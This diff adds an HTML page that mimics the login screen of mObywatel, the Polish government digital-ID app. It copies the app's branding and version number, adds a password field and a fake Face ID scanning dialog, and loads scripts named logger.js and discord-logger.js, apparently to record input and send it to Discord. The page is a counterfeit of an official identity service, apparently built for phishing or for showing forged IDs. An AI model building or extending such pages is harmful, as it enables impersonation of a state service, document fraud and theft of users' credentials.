@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <title>mObywatel</title>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="assets/id.css?v=1.6">
+    <link rel="stylesheet" href="assets/main.css">
+    <link rel="icon" type="image/x-icon" href="https://i.imgur.com/U7TRg0V.png">
+    <link rel="apple-touch-icon" href="https://i.imgur.com/U7TRg0V.png">
+    <link rel="shortcut icon" href="https://i.imgur.com/U7TRg0V.png">
+
+    <meta name="theme-color" content="#111218">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="manifest" href="./manifest.json">
+
+    <style>
+        /* Styl iOS Face ID Overlay */
+        .faceid-modal-backdrop {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.45);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .faceid-modal-backdrop.active {
+            display: flex;
+            animation: fadeInModal 0.25s ease-out;
+        }
+
+        @keyframes fadeInModal {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .faceid-card {
+            background: rgba(28, 33, 40, 0.88);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-radius: 28px;
+            padding: 32px 28px 24px;
+            width: 85%;
+            max-width: 310px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            animation: popCard 0.28s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popCard {
+            from { transform: scale(0.85); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .faceid-icon-wrapper {
+            position: relative;
+            width: 76px;
+            height: 76px;
+            margin-bottom: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .faceid-icon {
+            width: 64px;
+            height: 64px;
+            object-fit: contain;
+            filter: invert(1);
+            transition: all 0.3s ease;
+        }
+
+        .faceid-pulse {
+            position: absolute;
+            width: 76px;
+            height: 76px;
+            border-radius: 18px;
+            border: 2px solid rgba(74, 162, 252, 0.6);
+            animation: scanPulse 1.4s infinite ease-in-out;
+        }
+
+        @keyframes scanPulse {
+            0% { transform: scale(0.9); opacity: 0.8; }
+            50% { transform: scale(1.1); opacity: 0.3; }
+            100% { transform: scale(0.9); opacity: 0.8; }
+        }
+
+        .faceid-check {
+            display: none;
+            width: 58px;
+            height: 58px;
+            border-radius: 50%;
+            background: #10b981;
+            color: #ffffff;
+            font-size: 32px;
+            line-height: 58px;
+            text-align: center;
+            font-weight: 700;
+            animation: popCheck 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popCheck {
+            from { transform: scale(0.5); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .faceid-title {
+            color: #ffffff;
+            font-size: 19px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            letter-spacing: -0.3px;
+        }
+
+        .faceid-subtitle {
+            color: #8b92a0;
+            font-size: 13px;
+            line-height: 17px;
+            margin-bottom: 20px;
+        }
+
+        .faceid-cancel-btn {
+            background: rgba(255, 255, 255, 0.08);
+            border: none;
+            color: #4ba4fe;
+            font-size: 15px;
+            font-weight: 500;
+            padding: 10px 24px;
+            border-radius: 20px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        /* Przycisk wywołania Face ID pod hasłem */
+        .faceid-trigger-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 14px;
+            cursor: pointer;
+            color: #4ba4fe;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .faceid-trigger-icon {
+            width: 22px;
+            height: 22px;
+            object-fit: contain;
+            filter: invert(1);
+        }
+    </style>
+</head>
+
+<body>
+    <div class="background"></div>
+    <div class="top_grid">
+        <img class="logo" src="https://i.imgur.com/30pODeI.png" alt="Logo">
+        <p class="logo_text">mObywatel</p>
+    </div>
+
+    <div class="top_text">
+        <p class="welcome"></p>
+        <p class="login_text">Zaloguj się do aplikacji.</p>
+    </div>
+
+    <div class="password_box">
+        <div class="password_grid">
+            <p class="password_text">Hasło</p>
+            <div class="input_holder">
+                <input class="password_input" type="password" placeholder="Wpisz hasło" autocomplete="current-password">
+                <div class="eye"></div>
+            </div>
+            <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+                <p class="forgot_password">Nie pamiętasz hasła?</p>
+                <div class="faceid-trigger-row" onclick="startFaceID()">
+                    <img src="more_files/face.png" class="faceid-trigger-icon" alt="Face ID">
+                    <span>Face ID</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="bottom">
+        <p class="login">Zaloguj się</p>
+
+        <div class="data" style="margin-bottom: 16px;">
+            <img class="logo_other" style="height: 50px; width: auto; max-width: 90%; margin: 0 auto; display: block;" src="IMG_4756.png" alt="COI">
+        </div>
+        <div>
+            <p class="version" style="text-align: center; color: #888d96;">wersja 4.71.0 (5323)</p>
+        </div>
+    </div>
+
+    <!-- Modal Face ID -->
+    <div class="faceid-modal-backdrop" id="faceIdModal">
+        <div class="faceid-card">
+            <div class="faceid-icon-wrapper">
+                <div class="faceid-pulse" id="faceIdPulse"></div>
+                <img src="more_files/face.png" class="faceid-icon" id="faceIdIcon" alt="Face ID">
+                <div class="faceid-check" id="faceIdCheck">✓</div>
+            </div>
+            <div class="faceid-title">Face ID dla mObywatel</div>
+            <div class="faceid-subtitle" id="faceIdSubtitle">Potwierdź tożsamość, aby się zalogować</div>
+            <button class="faceid-cancel-btn" onclick="cancelFaceID()">Użyj hasła</button>
+        </div>
+    </div>
+
+    <script src="assets/id.js?v=2.0"></script>
+    <script src="assets/manifest.js"></script>
+    <script src="assets/logger.js"></script>
+    <script src="assets/discord-logger.js"></script>
+</body>
+</html>
